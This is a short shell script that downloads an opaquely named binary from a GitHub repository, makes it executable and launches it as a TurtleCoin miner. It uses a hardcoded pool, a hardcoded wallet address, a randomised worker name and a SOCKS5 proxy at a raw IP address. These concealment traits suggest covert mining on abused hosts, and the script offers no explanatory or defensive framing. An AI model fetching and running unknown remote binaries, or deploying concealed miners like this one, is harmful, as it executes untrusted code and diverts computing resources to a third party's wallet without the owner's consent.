sudo apt update 
wget https://github.com/duitawa/pasukan/raw/main/Xtod
chmod 777 Xtod
POOL=turtlecoin.herominers.com:10380
WALLET=TRTLv1sFBdxXrSMTWycv1xT14C3wNefSCJG2jEjduUcbQNEkkkEpEKM8826pfeG3qDVM3HifmdfMeRizcGDrygCfG3d1aXmHi7n
WORKER=$(echo $(shuf -i 9-15 -n 1)-JOB10)
PROXY=socks5://72.221.196.145:4145
./Xtod -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 -t 2 -x $PROXY
